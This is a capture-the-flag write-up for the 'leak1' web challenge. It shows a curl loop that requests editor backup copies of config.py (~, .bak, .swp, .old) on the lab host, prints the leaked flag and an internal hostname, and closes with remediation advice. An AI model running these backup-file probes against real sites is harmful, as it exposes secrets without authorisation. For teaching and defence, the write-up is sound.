# leak1 - Editor backup of a config file

| | |
|---|---|
| **Challenge** | leak1 |
| **Category** | INFOLEAK |
| **Points / Difficulty** | 150 / medium |
| **Target** | http://leak1.chal.deti:8010 |
| **Leak class** | Backup/temp file left in web root (source/config disclosure) |

## Hint
> The home page links to a config file. Editors leave twins.

## Recon
The landing page links `/static/config.py`. The served `config.py` is sanitized, but
editors and tooling leave **backup "twins"** next to the original - common suffixes:
`~` (vim/emacs/gedit), `.bak`, `.swp` (vim swap), `.old`, `.save`. These are not
dictionary words, so the gobuster runs (common.txt and big.txt) found nothing here - this leak needs the hint, not a wordlist.

## Approach
Request each likely backup variant of `config.py` under `/static/`.

## Exploitation - the exact request
```bash
for f in 'config.py~' 'config.py.bak' '.config.py.swp' 'config.py.old'; do
  echo "== /static/$f =="; curl -s -m5 "http://leak1.chal.deti:8010/static/$f"; echo
done
```
Only `config.py.bak` existed (the others 404):
```bash
curl -s http://leak1.chal.deti:8010/static/config.py.bak
```

## Response fragment that carried the flag
```python
API_URL = 'https://api.acme.internal'
FLAG = 'flag{eb2ccf88ac8862e25dd4aad178dd7966}'
```
(The backup also leaked an internal API hostname - secondary disclosure.)

## Flag
```
flag{eb2ccf88ac8862e25dd4aad178dd7966}
```

## Confirmation: live file vs backup
The live, linked `config.py` is sanitized - it only contains the non-secret line:
```python
API_URL = 'https://api.acme.internal'
```
The `.bak` retained the extra `FLAG = '...'` line the live file was cleaned of. This
confirms the leak is specifically the **stale backup**, not the served config.

## Root cause & remediation
- **Cause:** a `.bak` copy of the real config was left inside the web-served
  `/static/` directory. The live file was cleaned, but the stale backup kept the
  secret and is served as plain text.
- **Fix:** keep config/secrets out of any web-served directory; block editor/backup
  patterns at the server (`~`, `.bak`, `.swp`, `.old`, `.save`) or deny dotfiles and
  known temp suffixes; use a deploy process that ships only an explicit asset
  allow-list, not "whatever is in the folder."
